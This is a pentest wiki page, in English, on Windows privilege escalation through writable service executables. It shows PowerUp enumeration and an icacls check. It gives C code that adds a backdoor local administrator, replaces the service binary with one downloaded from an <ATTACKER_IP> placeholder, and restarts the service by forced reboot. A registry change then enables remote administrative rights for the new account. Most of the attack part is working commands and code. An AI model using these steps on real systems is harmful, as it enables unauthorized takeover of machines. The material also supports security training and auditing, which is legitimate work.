# 🛠️ Weak service permissions

## Theory

File permissions in Windows control who can access, modify, or execute files on the system. If these permissions are misconfigured, unauthorized users could potentially alter or replace critical files, leading to security vulnerabilities such as unauthorized access.

Here's a quick summary of Windows file permissions based on the provided table:

    F (Full access): Grants complete control over the file, including modifying and deleting it.
    M (Modify access): Allows editing and deleting the file, but not changing permissions.
    RX (Read and execute access): Permits viewing the file and executing it if it's an executable.
    R (Read-only access): Only allows viewing the file without making changes.
    W (Write-only access): Permits writing to the file but not reading or executing it.

## Pratice

### Insecure permissions on service executable 

This type of abuse can occur when the binary of a Windows service is misconfigured, meaning that the permissions for this binary allow, for example, a local user without special privileges to modify it or even replace it with a malicious one, the Attacker can obtain the privileges of the service account in general a high privileges account.

For the enumeration can be done with Powershell, first using native Powershell commands (Living off the Land) But also with [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). The main difference between the two is on the result PowerUp is able to tell you if a service is vulnerable or not while PowerShell just lists the Binary Services. In this example the **aniService** service is misconfigured and vulnerable to this attack.

```powershell
# USING POWERSHELL
> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# USING POWERUP
> Invoke-AllChecks
[*] Checking service executable and argument permissions...


ServiceName    : aniService
Path           : C:\Program Files\AniService\ani.exe
ModifiableFile : C:\Program Files\AniService\ani.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'aniService'
```

If you have identified your vulnerable binary with a tool like PowerUp or even Winpeas, you can check the permissions of this binary with **icacls.exe**. The most interesting permissions are (F) and (M) if they are related to a group such as `Everyone:` or a local user for exemple. 
```powershell
> icacls "C:\Program Files\AniService\ani.exe"
C:\Program Files\AniService\ani.exe
                                    AUTORITE NT\System:(F)
                                    BUILTIN\Administrators:(F)
                                    Everyone:(F)
                                    BUILTIN\Users:(RX)
```

In the current practical case the executable permission (F) on the group "Everyone", but if the permission was set in (M) it would also have been possible to abuse. Thanks to this bad configuration the attacker can simply replace the binary with another malicious one. it is possible to use PowerUp for automated task.
```powershell
> Install-ServiceBinary -ServiceName 'aniService' -User vador -P "D4rkIsD@rk"
```

Once the command is launched it will just need to **restart the service** to be sure that the abuse is well worked. 

The second method consists of creating yourself your malicious binary that can have advantages including the bypass of the AV detection. Here is a simple C code that will execute a system windows command (You can of course replace the system command with another.).
```C
#include <stdlib.h>
int main ()
{
int i;
    i = system("net user vador D4rkIsD@rk /add && timeout /t 2 && net localgroup Administrators vador /add");
return 0;
}

```

To compile Windows Executable it is possible to use `i686-w64-mingw32-gcc`.
```bash
> i686-w64-mingw32-gcc <CODE.c> -lws2_32 -o <FILE.exe>
```

Thanks to the wrong permission the attacker can replace the old executable by renominating it for example. Then it will be able to add the new malicious file with a name identical to the original one.
```powershell
> move ani.exe ani.exe.bak

# DOWNLOAD THE MALICIOUS EXECUTABLE
> iwr http://<ATTACKER_IP>/malicious.exe -Outfile "C:\Program Files\AniService\ani.exe"
```
Once the binary is replaced you have to restart the service, to check if this is possible a tool of the suite sysinternal can help, [accesschk.exe](https://download.sysinternals.com/files/AccessChk.zip) is a tool that allows adminsys to quickly check what type of access users or specific groups have to resources, including files, directories, registry keys, global objects and Windows services.
```powershell
> ./accesschk64.exe /accepteula -ucqv <SERVICE_NAME>

Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

aniService
  Medium Mandatory Level (Default) [No-Write-Up]
  R  DESKTOP-5VHCKF3\admin
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
```
The permissions that manage the start are **SERVICE_START** and **SERVICE_STOP** if they are present on your user or on a group that controls you then you can restart the service.
```powershell
# STOP SERVICE
> net stop <SERVICE_NAME>

# START SERVICE
> net start <SERVICE_NAME>
```
There is an alternative if ever the Startup permissions are not present, with the sc.exe tool you can look at the boot method used by the service. If it is on `AUTO_START`, this means that the service starts at windows boot.
```powershell
> sc.exe qc <SERVICE_NAME>
[SC] QueryServiceConfig réussite(s)

SERVICE_NAME: aniService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\AniService\ani.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Anakin Skywalker Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
There is a Windows privilege called **SeShutdownPrivilege**, which allows you to reboot a Windows system. With this privilege, you can indirectly restart the service without having the direct permissions to restart it.
```powershell
> shutdown /r /t 0
```
Once the service is rebooted your payload should be run.

A small nuance when adding a local user: there is a registry key named **LocalAccountTokenFilterPolicy** that, when enabled, prevents users in the local administrators groupexcept for those with a RID of 500 (the built-in Administrator account) from obtaining full administrator rights during remote connections, such as to administrative shares like C$. To disable this restriction. The value of the key needs to be changed.
```powershell
> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t Reg_DWORD /d 1
```

#### Ressources 
[https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy](https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy)

[https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/](https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/)
